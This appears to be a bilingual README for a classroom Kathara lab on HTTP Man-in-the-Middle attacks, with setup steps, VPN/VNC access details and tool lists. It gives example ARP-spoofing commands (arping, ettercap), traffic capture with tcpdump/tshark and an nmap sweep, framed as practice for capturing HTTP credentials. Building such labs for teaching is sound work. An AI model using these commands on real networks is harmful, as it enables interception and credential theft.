# p3 MITM HTTP Security Lab / Laboratorio MITM HTTP p3

[ES]
Escenario de ciberseguridad para práctica de ataque Man-in-the-Middle sobre HTTP.
LAN atacante-víctima, salida a Internet por NAT, acceso remoto por WireGuard,
y escritorio gráfico en víctima por VNC.

[EN]
Cybersecurity scenario for Man-in-the-Middle attack practice over HTTP.
Attacker-victim LAN, Internet egress via NAT, remote access through WireGuard,
and graphical desktop on victim via VNC.

## Quick Start / Inicio Rápido

```bash
cd practica3/escenario1/kathara

# Las imágenes se construyen automáticamente al ejecutar start-lab.sh
# O manualmente:
docker build -t kathara-vpn -f Dockerfile.vpn .
docker build -t kathara-desktop -f Dockerfile.desktop .
docker build -t kathara-kali -f Dockerfile.kali .

chmod +x start-lab.sh stop-lab.sh verify.sh
./start-lab.sh
```

## Modes / Modos

- Full mode (VPN + GUI): `./start-lab.sh`
- CLI-only mode: `./start-lab.sh --cli-only`
- Verify: `./verify.sh --wait-for-handshake 30`
- Stop: `./stop-lab.sh`

## Main Access / Acceso Principal

- WireGuard client config: `./shared/vpn/student1.conf`
- VNC desktop (víctima): `192.168.0.2:5901`
- VNC password: `password`
- Atacante CLI: Herramientas de pentesting disponibles (ver lista abajo)

## Tools Available / Herramientas Disponibles

### x86_64 (Intel/AMD)
- ✅ Bettercap (si descarga exitosa) - `bettercap -iface eth0`
- ✅ Ettercap (si disponible en repos) - `ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1//`
- ✅ Tcpdump/Tshark - Captura y análisis de tráfico
- ✅ Nmap - Escaneo de redes
- ✅ Arping - ARP spoofing

### ARM64 (Apple Silicon)
- ✅ Tcpdump/Tshark - Captura y análisis de tráfico
- ✅ Nmap - Escaneo de redes  
- ✅ Arping - ARP spoofing
- ⚠️ Ettercap (si disponible en repositorios)
- ❌ Bettercap (no hay builds oficiales para ARM64)

### Comandos de ejemplo / Example commands

```bash
# ARP Spoofing con arping (funciona en todas las arquitecturas)
kathara exec -d "$(pwd)" atacante "arping -U -I eth0 -s 192.168.0.1 192.168.0.2"

# Captura de tráfico HTTP
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 host 192.168.0.2 and port 80 -A"

# Análisis con tshark
kathara exec -d "$(pwd)" atacante "tshark -i eth0 -Y 'http.request'"

# Escaneo de red
kathara exec -d "$(pwd)" atacante "nmap -sP 192.168.0.0/24"
```

## Documentation / Documentación

- Docs index: `docs/INDEX.md`
- Full guide: `docs/README.md`
- Quick commands: `docs/QUICKSTART.md`
- Architecture: `docs/ARCHITECTURE.md`
- Network details: `docs/NETWORK.md`
- MITM examples: `docs/EXAMPLES.md`
- Docker images: `docs/DOCKER.md`
- Multi-arch support: `docs/ARCHITECTURE_SUPPORT.md`

## Practice Focus / Enfoque Práctico

Este escenario está diseñado específicamente para practicar ataques MITM HTTP:
- ARP Spoofing con arping/tcpdump (multi-arquitectura)
- Captura de credenciales HTTP
- Análisis de tráfico con tshark/tcpdump
- Intercepción de sesiones web no cifradas

## Multi-Architecture Support / Soporte Multi-Arquitectura

✅ **x86_64** (Intel/AMD): Todas las herramientas disponibles  
✅ **ARM64** (Apple Silicon M1/M2): Herramientas nativas (tcpdump, tshark, nmap, arping)

El Dockerfile.kali detecta automáticamente la arquitectura e instala las herramientas disponibles.

Ver `docs/ARCHITECTURE_SUPPORT.md` para más detalles.
